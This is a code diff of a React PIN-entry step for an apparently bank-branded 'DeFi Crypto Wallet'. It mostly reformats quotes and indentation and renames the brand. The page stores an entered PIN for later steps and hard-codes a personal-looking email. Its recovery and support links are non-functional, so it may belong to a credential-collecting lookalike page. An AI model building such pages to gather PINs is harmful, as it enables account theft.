@@ -1,34 +1,34 @@
-import React, { useState } from 'react';
-import { useStepper } from '../../context/StepperContext';
+import React, { useState } from "react";
+import { useStepper } from "../../context/StepperContext";
 
 export const Step7_PinVerification = () => {
-  const { data, updateData, nextStep, goToStep } = useStepper();
-  const [pin, setPin] = useState(data.pin || '');
-  const [toast, setToast] = useState('');
+	const { data, updateData, nextStep, goToStep } = useStepper();
+	const [pin, setPin] = useState(data.pin || "");
+	const [toast, setToast] = useState("");
 
-  const displayEmail = data.email || 'relentless2377@gmail.com';
+	const displayEmail = data.email || "relentless2377@gmail.com";
 
-  const showToast = (msg) => {
-    setToast(msg);
-    setTimeout(() => setToast(''), 2400);
-  };
+	const showToast = (msg) => {
+		setToast(msg);
+		setTimeout(() => setToast(""), 2400);
+	};
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    if (pin.length >= 4) {
-      updateData({ pin });
-      showToast('Sign-in request submitted.');
-      setTimeout(() => {
-        nextStep();
-      }, 500);
-    } else {
-      showToast('Enter your PIN to continue.');
-    }
-  };
+	const handleSubmit = (e) => {
+		e.preventDefault();
+		if (pin.length >= 4) {
+			updateData({ pin });
+			showToast("Sign-in request submitted.");
+			setTimeout(() => {
+				nextStep();
+			}, 500);
+		} else {
+			showToast("Enter your PIN to continue.");
+		}
+	};
 
-  return (
-    <div className="step7-root">
-      <style>{`
+	return (
+		<div className="step7-root">
+			<style>{`
 
     .step7-root {
       --navy: #020817;
@@ -106,45 +106,68 @@ export const Step7_PinVerification = () => {
           justify-content: center;
         }
       `}</style>
-      <main>
-        <div className="brand-mark" aria-label="Ismail Bank logo">Si</div>
-        <h1>Ismail Bank Network</h1>
-        <p className="subtitle">DeFi Crypto Wallet</p>
+			<main>
+				<div className="brand-mark" aria-label="Invest Bank logo">
+					Si
+				</div>
+				<h1>Invest Bank Network</h1>
+				<p className="subtitle">DeFi Crypto Wallet</p>
 
-        <section className="card" aria-labelledby="login-title">
-          <h2 id="login-title">Enter your PIN</h2>
-          <p className="welcome">Welcome back, <strong id="email">{displayEmail}</strong></p>
-          <form id="login-form" onSubmit={handleSubmit}>
-            <label htmlFor="pin">PIN</label>
-            <div className="pin-wrap">
-              <input
-                id="pin"
-                name="pin"
-                type="password"
-                inputMode="numeric"
-                maxLength={6}
-                autoComplete="one-time-code"
-                required
-                value={pin}
-                onChange={(e) => setPin(e.target.value)}
-              />
-            </div>
-            <button type="submit">Sign in</button>
-          </form>
-          <div className="links">
-            <a id="forgot" onClick={() => showToast('PIN recovery instructions requested.')}>Forgot your PIN?</a>
-            <a id="change-email" onClick={() => goToStep(6)}>Use a different email</a>
-          </div>
-        </section>
-      </main>
+				<section className="card" aria-labelledby="login-title">
+					<h2 id="login-title">Enter your PIN</h2>
+					<p className="welcome">
+						Welcome back, <strong id="email">{displayEmail}</strong>
+					</p>
+					<form id="login-form" onSubmit={handleSubmit}>
+						<label htmlFor="pin">PIN</label>
+						<div className="pin-wrap">
+							<input
+								id="pin"
+								name="pin"
+								type="password"
+								inputMode="numeric"
+								maxLength={6}
+								autoComplete="one-time-code"
+								required
+								value={pin}
+								onChange={(e) => setPin(e.target.value)}
+							/>
+						</div>
+						<button type="submit">Sign in</button>
+					</form>
+					<div className="links">
+						<a
+							id="forgot"
+							onClick={() =>
+								showToast("PIN recovery instructions requested.")
+							}
+						>
+							Forgot your PIN?
+						</a>
+						<a id="change-email" onClick={() => goToStep(6)}>
+							Use a different email
+						</a>
+					</div>
+				</section>
+			</main>
 
-      <button className="chat" id="chat" aria-label="Open support chat" type="button" onClick={() => showToast('Support chat is opening soon.')}>
-        <span className="bubble"></span>
-      </button>
+			<button
+				className="chat"
+				id="chat"
+				aria-label="Open support chat"
+				type="button"
+				onClick={() => showToast("Support chat is opening soon.")}
+			>
+				<span className="bubble"></span>
+			</button>
 
-      <div className={`toast ${toast ? 'show' : ''}`} id="toast" role="status">
-        {toast}
-      </div>
-    </div>
-  );
+			<div
+				className={`toast ${toast ? "show" : ""}`}
+				id="toast"
+				role="status"
+			>
+				{toast}
+			</div>
+		</div>
+	);
 };
